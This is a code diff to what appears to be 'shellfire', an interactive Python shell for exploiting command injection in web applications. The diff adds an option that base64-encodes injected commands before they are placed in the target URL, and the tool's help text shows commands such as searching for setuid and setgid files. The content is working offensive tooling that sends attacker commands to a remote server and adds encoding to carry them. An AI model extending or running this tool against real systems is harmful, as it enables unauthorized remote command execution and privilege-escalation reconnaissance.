@@ -4,6 +4,7 @@
 # Aug 2016
 
 import argparse
+import base64
 import json
 import os
 import re
@@ -18,7 +19,7 @@ import time
 ############################################################
 ## Configs
 
-version = "0.5"
+version = "0.6"
 url = "http://www.example.com?"
 history_file = os.path.abspath(os.path.expanduser("~/.shellfire_history"))
 post_data = {}
@@ -32,6 +33,7 @@ auth_user = None
 auth_pass = None
 payload = ""
 payload_type = "PHP"
+cmd_encode_b64 = False
 
 ############################################################
 ## Payloads
@@ -85,6 +87,9 @@ def show_help(cmd=None):
     sys.stdout.write(".auth <username>:<password> - set the HTTP Auth credentials\n")
   elif cmd == "cookies":
     sys.stdout.write(".cookies <json> - a json string representing cookies you wish to send\n")
+  elif cmd == "encode":
+    sys.stdout.write(".encode base64 - encode commands with base64 before sending\n")
+    sys.stdout.write(".encode none - do not encode commands before sending\n")
   elif cmd == "find":
     sys.stdout.write(".find setuid - search for setuid files\n")
     sys.stdout.write(".find setgid - search for setgid files\n")
@@ -119,6 +124,7 @@ def show_help(cmd=None):
 Available commands:
   .auth
   .cookies
+  .encode
   .exit
   .find
   .help
@@ -255,6 +261,15 @@ while True:
       sys.stdout.write("[!] Invalid parameters\n")
       continue
     cookies = json.loads(input[len(cmd[0])+1:])
+  elif cmd[0] == ".encode":
+    if len(cmd) != 2:
+      sys.stdout.write("[!] Invalid parameters\n")
+      continue
+    exec_cmd = False
+    if cmd[1] == "base64":
+      cmd_encode_b64 = True
+    else:
+      cmd_encode_b64 = False
   elif cmd[0] == ".find":
     if len(cmd) != 2:
       sys.stdout.write("[!] Invalid parameters\n")
@@ -378,8 +393,11 @@ while True:
     exec_cmd = True
 
   if exec_cmd:
-    cmd = re.sub('&', '%26', input)
-    cmd = cmd.replace("\\", "\\\\")
+    if cmd_encode_b64:
+      cmd = base64.b64encode(input.encode()).decode()
+    else:
+      cmd = re.sub('&', '%26', input)
+      cmd = cmd.replace("\\", "\\\\")
     if '%CMD%' in url:
       query = re.sub('%CMD%', cmd, url)
     else:
